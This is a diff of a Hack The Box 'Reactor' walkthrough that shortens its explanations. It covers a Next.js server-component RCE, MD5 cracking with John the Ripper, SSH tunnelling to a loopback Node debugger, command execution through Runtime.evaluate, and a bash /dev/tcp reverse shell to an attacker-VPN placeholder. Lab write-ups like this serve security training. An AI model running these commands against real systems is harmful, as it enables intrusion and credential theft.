@@ -7,27 +7,27 @@ nav_order: 1
 
 # HTB Reactor
 
-**Machine:** Reactor (Linux) · **Difficulty:** Medium · **Attack surface:** SSH (22), HTTP (3000)
+**Machine:** Reactor (Linux) · **Difficulty:** Easy · **Attack surface:** SSH (22), HTTP (3000)
 
-Reactor is a straight line from a headline-grade vulnerability in a popular web framework all the way to full control of the machine ("root," meaning the most privileged account on a Linux system). The interesting part is the middle: the box buries the real path to that privileged account under a handful of deliberately tempting dead ends. Getting from "a foothold as a low-privilege user" to "root" is less about exploit skill and more about not chasing the one clue that *looks* like the vulnerability but isn't.
+Reactor is a straight line from a headline-grade vulnerability in a popular web framework all the way to root. The interesting part is the middle: the box buries the real path to root under a handful of deliberately tempting dead ends. Getting from foothold to root is less about exploit skill and more about not chasing the one clue that *looks* like the vulnerability but isn't.
 
 ---
 
 ## 1. Recon & Fingerprinting
 
-The first step on almost any box is a port scan with **nmap**, a tool that checks which network services a machine is listening on. Here it turns up exactly two: SSH (remote terminal access, port 22) and a web service on port 3000.
+An nmap scan turns up exactly two ports: SSH (22) and a web service on port 3000.
 
-The website itself is a fake nuclear-plant monitoring dashboard — **"REACTORWATCH — Core Monitoring System v3.2.1"** — styled convincingly enough to be a distraction in its own right. But what matters is what it's built with underneath: **Next.js 15.0.3**, a popular React-based web framework, using a part of it called the App Router.
+The website itself is a fake nuclear-plant monitoring dashboard — **"REACTORWATCH — Core Monitoring System v3.2.1"** — styled convincingly enough to be a distraction in its own right. But what matters is what it's built with underneath: **Next.js 15.0.3**, using the App Router.
 
-The page's source code gives this away immediately. Next.js's "React Server Components" feature ships data to the browser as `self.__next_f.push(...)` blocks — essentially, pre-rendered chunks of the page (metrics, logs, personnel records) serialized into a format called "Flight" and streamed down as part of the initial HTML. None of that data contained credentials, but it confirmed the exact framework, the fact that the newer App Router was in use, and the build ID — enough to tell whether this installation sits in a known-vulnerable version range.
+The page's source code gives this away immediately. Next.js's React Server Components feature ships data to the browser as `self.__next_f.push(...)` blocks — pre-rendered chunks of the page (metrics, logs, personnel records) serialized into the "Flight" format and streamed down as part of the initial HTML. None of that data contained credentials, but it confirmed the exact framework, the fact that the App Router was in use, and the build ID — enough to tell whether this installation sits in a known-vulnerable version range.
 
-A pass with feroxbuster (a tool that brute-forces URLs by trying thousands of common path names against a server) against `/_next/static/` turned up nothing beyond the framework's own expected files — no hidden pages, no stray build artifacts left behind by mistake. This web app wasn't going to be broken into by finding a secret page; it was going to be broken into through a flaw in the framework itself.
+A feroxbuster pass against `/_next/static/` turned up nothing beyond the framework's own expected files — no hidden pages, no stray build artifacts left behind by mistake. This app wasn't going to be broken into by finding a secret page; it was going to be broken into through a flaw in the framework itself.
 
 ---
 
 ## 2. Initial Foothold — React2Shell (CVE-2025-55182)
 
-Next.js 15.0.3 falls inside the vulnerable range for **React2Shell**, tracked as **CVE-2025-55182** (CVEs are the standard numbered IDs used to reference specific, publicly disclosed vulnerabilities). This one is about as severe as they come: it can be triggered by anyone on the network with no login required (the technical term is "pre-authenticated"), it results in arbitrary command execution on the server (remote code execution, or RCE), and it carries the maximum possible severity score, CVSS 10.0.
+Next.js 15.0.3 falls inside the vulnerable range for **React2Shell**, tracked as **CVE-2025-55182**. This one is about as severe as they come: pre-authenticated RCE over the network, with the maximum possible severity score, CVSS 10.0.
 
 It affects React's own `react-server-dom-*` packages (versions 19.0–19.2.0) and, by extension, every framework built on top of them — Next.js, React Router, Waku, and others — because the flaw lives in React's own code for handling Server Components, not in anything Next.js added on top.
 
@@ -46,7 +46,7 @@ This returned a working shell (interactive command execution) as the Linux user 
 
 ## 3. Loot — `.env` and the SQLite Database
 
-The `.env` file (a plain-text file commonly used to store an application's configuration and secrets) held the expected settings, plus two things worth a closer look:
+The `.env` file held the expected settings, plus two things worth a closer look:
 
 | Key | Value |
 |-----|-------|
@@ -56,16 +56,16 @@ The `.env` file (a plain-text file commonly used to store an application's confi
 | `ALERT_WEBHOOK` | `https://alerts.internal.reactor.htb/webhook` |
 | `NODE_ENV` | `production` |
 
-`SENSOR_API_KEY` looked promising at first glance, but nothing on the box actually consumed it outside the app itself. `ALERT_WEBHOOK` pointed at an internal hostname that was never defined in `/etc/hosts` (the file that maps hostnames to IP addresses) and never resolved to anything — both turned out to be flavor text rather than a real lead.
+`SENSOR_API_KEY` looked promising at first glance, but nothing on the box actually consumed it outside the app itself. `ALERT_WEBHOOK` pointed at an internal hostname that was never defined in `/etc/hosts` and never resolved to anything — both turned out to be flavor text rather than a real lead.
 
-The database referenced by `DB_PATH` was more useful. SQLite is a lightweight, file-based database — the whole thing is just one file (`reactor.db`) that can be copied off and opened locally. Doing that and reading its `users` table surfaced two accounts:
+The database referenced by `DB_PATH` was more useful. Copying `reactor.db` off the box and reading its `users` table surfaced two accounts:
 
 | id  | username | password_hash (MD5)                | role          |
 | --- | -------- | ---------------------------------- | ------------- |
 | 1   | admin    | `a203b22191d7xxxxxxxxxa5c101b17b8` | administrator |
 | 2   | engineer | `39d97110eafexxxxxxxxx812cd271e8e` | operator      |
 
-Passwords should never be stored as-is; instead they're normally run through a one-way "hashing" function, and the hash is what gets stored. MD5 is a hashing algorithm that's fast, unsalted (meaning two users with the same password get the identical hash, and there's no extra random data mixed in to slow down guessing), and badly outdated for this purpose — which makes it practical to "crack": take a huge list of common real-world passwords, hash each one the same way, and check for a match. I used **John the Ripper**, a standard password-cracking tool, against the well-known **rockyou** wordlist (a leaked list of millions of real passwords, used as the default starting point for this kind of attack):
+Unsalted MD5 is fast and trivial to crack, so it's just a matter of running the hashes against a wordlist with John the Ripper and rockyou:
 
 ```bash
 john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
@@ -78,21 +78,21 @@ john --show --format=Raw-MD5 hashes.txt
 
 ## 4. Looking for the Way to Root — Signal vs. Noise
 
-Once logged in as `engineer`, the next goal is privilege escalation: finding some flaw or misconfiguration that lets a low-privilege account gain full administrative (root) control. The usual enumeration pass — systematically checking group memberships, scheduled tasks, running services, and so on for anything exploitable — turned up several things that looked like the intended path but weren't:
+Once logged in as `engineer`, the usual privesc enumeration pass turned up several things that looked like the intended path but weren't:
 
 | Finding | Verdict |
 | --- | --- |
-| `engineer` belongs to the `lxd` group, and `/run/lxd-installer.socket` is writable (LXD is a container platform; being in its group is a well-known way to escalate to root on misconfigured boxes) | **Decoy.** LXD isn't actually installed, and installing it would require downloading it via `snap`, which needs outbound internet access — blocked from this box. Trying to use it just errors out through an installer stub; there's no real LXD service running to abuse. |
-| `/etc/crontab` and systemd timers (Linux's two main ways of running tasks on a schedule) | Stock Ubuntu configuration, nothing custom planted here. |
+| `engineer` belongs to the `lxd` group, and `/run/lxd-installer.socket` is writable | **Decoy.** LXD isn't actually installed, and installing it would require downloading it via `snap`, which needs outbound internet access — blocked from this box. Trying to use it just errors out through an installer stub; there's no real LXD service running to abuse. |
+| `/etc/crontab` and systemd timers | Stock Ubuntu configuration, nothing custom planted here. |
 | `ALERT_WEBHOOK`'s internal hostname | Unresolvable, as noted earlier — a loose end left over from the `.env` file, not a real lead. |
 
-The actual signal was buried in the output of `ss -tlnp`, a command that lists network ports a machine is currently listening on:
+The actual signal was buried in `ss -tlnp`:
 
 ```
 LISTEN  127.0.0.1:9229
 ```
 
-Port 9229 is the default for Node.js's built-in debugger, the **V8 Inspector** (started with the `--inspect` flag). It's bound to `127.0.0.1` — "loopback," meaning it only accepts connections that originate from the machine itself, not from the network — and the listing doesn't show which process on `engineer`'s own account owns it, which means it belongs to a separate, more privileged Node.js process running elsewhere on the box. A debugger port like this left reachable in anything resembling a real deployment is almost always a way in, and this box is no exception.
+Port 9229 is the default for Node's `--inspect` debugger (V8 Inspector). It's bound to loopback, and the listing doesn't show it under `engineer`'s own processes, which means it belongs to a separate, more privileged Node.js process running elsewhere on the box. A debugger port like this left reachable in anything resembling a real deployment is almost always a way in, and this box is no exception.
 
 ---
 
@@ -100,7 +100,7 @@ Port 9229 is the default for Node.js's built-in debugger, the **V8 Inspector** (
 
 ### The idea
 
-The V8 Inspector communicates using the **Chrome DevTools Protocol (CDP)** — the same protocol Chrome's own developer tools use to inspect a running web page, but here pointed at a running Node.js process instead. Any client that can reach it can issue a command called `Runtime.evaluate`, which runs arbitrary JavaScript *inside* that live process. Since that JavaScript can call Node's built-in modules, this trivially becomes the ability to run arbitrary system commands as whatever user owns the process. Because the port only accepts local connections, reaching it from outside requires an SSH tunnel: using the already-authenticated `engineer` SSH session to forward traffic from a port on my own machine straight to that loopback port on the target.
+The V8 Inspector speaks CDP directly — it's not "similar to" Chrome DevTools, it's the same protocol, just pointed at a Node.js process instead of a browser tab. Any client that can reach it can issue `Runtime.evaluate`, which runs arbitrary JavaScript *inside* that live process, and from there into Node's built-in modules — trivially, arbitrary system commands as whatever user owns the process. Since the port is loopback-only, reaching it means tunneling through the existing `engineer` SSH session.
 
 ### 5.1 Tunnel the inspector port
 
@@ -108,7 +108,7 @@ The V8 Inspector communicates using the **Chrome DevTools Protocol (CDP)** — t
 ssh -N -L 9229:127.0.0.1:9229 engineer@10.129.154.181
 ```
 
-The `-N` flag tells SSH "don't run a command or open a shell" — the session just sits there silently, holding the tunnel open. That's expected behavior, not a hang; everything else happens from a second terminal window. To confirm the tunnel is working: `curl http://127.0.0.1:9229/json`. (To add this forward to an SSH session that's already open, instead of starting a new one: press Enter to get to a fresh line, type `~C` to drop into SSH's own command prompt, then type `-L 9229:127.0.0.1:9229`.)
+`-N` just holds the tunnel open without a shell; that's expected, not a hang. Confirm it's working with `curl http://127.0.0.1:9229/json`. (To add this forward to an SSH session that's already open instead of starting a new one: press Enter for a fresh line, type `~C` to drop into SSH's own command prompt, then `-L 9229:127.0.0.1:9229`.)
 
 ### 5.2 Find the debugger's connection address
 
@@ -117,11 +117,11 @@ curl -s http://127.0.0.1:9229/json | jq -r '.[0].webSocketDebuggerUrl'
 # ws://127.0.0.1:9229/55f079fd-0d26-4eb1-974b-6126050222b2
 ```
 
-This address uses the **WebSocket** protocol (a persistent, two-way connection, as opposed to a normal one-off HTTP request) — that's how CDP messages are exchanged. The same `/json` response also lists the inspected process's `title` and source file `url`, worth noting in case the target app's source code is worth reviewing afterward.
+That's a WebSocket URL — CDP messages are exchanged over it. The same `/json` response also lists the inspected process's `title` and source file `url`, worth noting in case the target app's source code is worth reviewing afterward.
 
 ### 5.3 Connect and run commands
 
-`websocat`, a general-purpose WebSocket command-line client, isn't installed on Debian by default, so the practical options are: install `python3-websocket` and drive the connection from a small Python script, use `npx wscat -c <url>` if Node's package manager (npm) is available, download a standalone `websocat` binary from GitHub, or simply point a desktop Chrome/Chromium browser at `chrome://inspect` → Configure → `127.0.0.1:9229` and use its graphical debugger.
+`websocat` isn't installed on Debian by default, so the practical options are: install `python3-websocket` and drive the connection from a small Python script, use `npx wscat -c <url>` if npm is available, download a standalone `websocat` binary from GitHub, or point a desktop Chrome/Chromium browser at `chrome://inspect` → Configure → `127.0.0.1:9229` and use its graphical debugger.
 
 I used a small Python script that connects automatically and handles both normal replies and errors:
 
@@ -167,7 +167,7 @@ The command's output lands in `.result.result.value` of the JSON reply. If the t
 
 ### 5.4 After gaining access
 
-From here it's a normal post-exploitation checklist — the standard follow-up steps once you have code execution — just expressed as JavaScript sent over the WebSocket instead of shell commands typed directly:
+From here it's a normal post-exploitation checklist, just expressed as JavaScript sent over the WebSocket instead of shell commands typed directly:
 
 ```js
 process.mainModule.require('child_process').execSync('id').toString()      // who am I running as?
@@ -181,7 +181,7 @@ Worth checking along the way:
 - The application's source file, at the `url` reported by `/json`, in case it has hardcoded credentials worth reviewing.
 - Any other services listening only on loopback, reachable from this same machine, since this one was.
 
-For anything beyond a one-off command, it's less painful to open a full reverse shell (a connection back to your own machine that gives you an interactive terminal on the target) and work from there instead of typing one JavaScript expression at a time:
+For anything beyond a one-off command, it's less painful to pop a full reverse shell and work from there instead of typing one JavaScript expression at a time:
 
 ```js
 process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1"')
